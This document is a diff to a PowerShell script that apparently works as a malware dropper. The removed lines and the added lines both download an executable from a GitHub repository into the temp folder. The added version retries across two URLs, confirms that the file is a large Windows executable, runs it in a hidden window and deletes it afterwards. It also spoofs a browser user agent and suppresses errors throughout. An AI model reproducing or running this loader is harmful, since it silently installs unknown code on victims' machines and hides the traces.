@@ -1,13 +1,43 @@
-$n = [IO.Path]::Combine($env:TEMP, "sc.exe")
-$u = "https://media.githubusercontent.com/media/moratreey/hsh-likefired1337/main/sr.exe"
-$wc = New-Object System.Net.WebClient
-$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-try { $wc.DownloadFile($u, $n) } catch {}
-if (Test-Path $n) {
-    $si = New-Object System.Diagnostics.ProcessStartInfo
-    $si.FileName = $n
-    $si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $si.CreateNoWindow = $true
-    [System.Diagnostics.Process]::Start($si) | Out-Null
+try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+$r = 'moratreey/hsh-likefired1337'
+$n = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
+$u = @(
+    "https://github.com/$r/raw/main/sr.exe",
+    "https://media.githubusercontent.com/media/$r/main/sr.exe"
+)
+$ok = $false
+foreach ($x in $u) {
+    foreach ($i in 1..2) {
+        try {
+            $wc = New-Object Net.WebClient
+            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+            $wc.DownloadFile($x, $n)
+            if ((Get-Item $n).Length -gt 1048576) {
+                $fs = [IO.File]::OpenRead($n)
+                $b = New-Object byte[] 2
+                $fs.Read($b,0,2) | Out-Null
+                $fs.Close()
+                if ($b[0] -eq 0x4D -and $b[1] -eq 0x5A) { $ok = $true; break }
+            }
+            Remove-Item $n -Force -ErrorAction SilentlyContinue
+        } catch { }
+        Start-Sleep -Milliseconds 800
+    }
+    if ($ok) { break }
 }
+if ($ok) {
+    try {
+        $si = New-Object Diagnostics.ProcessStartInfo
+        $si.FileName = $n
+        $si.WorkingDirectory = $env:TEMP
+        $si.WindowStyle = 'Hidden'
+        $si.CreateNoWindow = $true
+        $si.UseShellExecute = $false
+        [Diagnostics.Process]::Start($si) | Out-Null
+    } catch {
+        try { Start-Process -FilePath $n -WindowStyle Hidden } catch { }
+    }
+    Start-Sleep -Seconds 4
+}
+Remove-Item $n -Force -ErrorAction SilentlyContinue
 [Environment]::Exit(0)
